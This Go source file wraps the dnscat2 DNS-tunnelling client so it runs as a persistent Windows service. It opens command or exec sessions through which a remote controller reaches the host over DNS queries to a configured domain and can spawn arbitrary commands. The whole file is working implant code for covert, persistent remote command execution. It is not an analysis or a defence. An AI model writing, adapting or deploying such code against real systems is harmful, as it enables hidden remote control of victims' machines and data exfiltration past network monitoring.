package main

import (
	"context"
	"fmt"
	"math/rand"
	"time"

	"dnscat2/pkg/controller"
	"dnscat2/pkg/driver/command"
	"dnscat2/pkg/session"
	"dnscat2/pkg/tunnel/dns"

	"golang.org/x/sys/windows/svc"
)

type dnscat2Service struct {
	config *Config
	cancel context.CancelFunc
}

func (s *dnscat2Service) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (bool, uint32) {
	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown

	// Tell SCM we are starting
	changes <- svc.Status{State: svc.StartPending}

	// Create context for graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	s.cancel = cancel

	// Start dnscat2 in background
	errChan := make(chan error, 1)
	go func() {
		errChan <- runDnscat(s.config)
	}()

	// Tell SCM we are running
	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}

	// Service control loop
loop:
	for {
		select {
		case c := <-r:
			switch c.Cmd {
			case svc.Interrogate:
				changes <- c.CurrentStatus

			case svc.Stop, svc.Shutdown:
				changes <- svc.Status{State: svc.StopPending}

				// Trigger graceful shutdown
				cancel()

				// Wait for cleanup with timeout
				select {
				case <-time.After(10 * time.Second):
					// Force cleanup if taking too long
					controller.Destroy()
				case <-ctx.Done():
					// Clean shutdown completed
				}

				break loop

			default:
				logError(fmt.Sprintf("Unexpected control request #%d", c))
			}

		case err := <-errChan:
			if err != nil {
				logError(fmt.Sprintf("dnscat2 error: %v", err))
				return true, 1
			}
			// dnscat2 exited normally
			break loop
		}
	}

	changes <- svc.Status{State: svc.Stopped}
	return false, 0
}

func runDnscat(config *Config) error {
	rand.Seed(time.Now().UnixNano())

	// Configure session settings
	session.PacketTrace = config.PacketTrace
	session.PacketDelay = time.Duration(config.Delay) * time.Millisecond
	session.DoEncryption = !config.NoEncryption
	session.PresharedSecret = config.Secret

	controller.SetMaxRetransmits(config.MaxRetransmit)

	// Determine DNS server
	dnsServer := config.DnsServer
	if dnsServer == "" {
		dnsServer = "8.8.8.8" // Fallback
	}

	// Create session
	var sess *session.Session
	var err error

	if config.ExecCommand != "" {
		sess, err = session.NewExecSession("exec", config.ExecCommand)
	} else {
		// Default to command session
		sess, err = newCommandSession("command")
	}

	if err != nil {
		return fmt.Errorf("failed to create session: %w", err)
	}

	controller.AddSession(sess)

	// Create and run DNS driver
	dnsDriver, err := dns.NewDriver(
		config.Domain,
		"0.0.0.0",
		uint16(config.DnsPort),
		config.DnsTypes,
		dnsServer,
	)
	if err != nil {
		return fmt.Errorf("failed to create DNS driver: %w", err)
	}

	defer dnsDriver.Close()
	defer controller.Destroy()

	// Run DNS driver (blocking)
	dnsDriver.Run()

	return nil
}

func newCommandSession(name string) (*session.Session, error) {
	sess, err := session.New(name)
	if err != nil {
		return nil, err
	}

	cmdDriver := command.NewDriver()

	// Set up callbacks
	cmdDriver.CreateSession = func(name, cmd string) uint16 {
		newSess, err := session.NewExecSession(name, cmd)
		if err != nil {
			logError(fmt.Sprintf("Failed to create exec session: %v", err))
			return 0
		}
		controller.AddSession(newSess)
		return newSess.ID
	}

	cmdDriver.OnShutdown = func() {
		controller.KillAllSessions()
	}

	cmdDriver.OnDelayChange = func(delay uint32) {
		session.PacketDelay = time.Duration(delay) * time.Millisecond
	}

	sess.Driver = cmdDriver
	sess.IsCommand = true

	return sess, nil
}
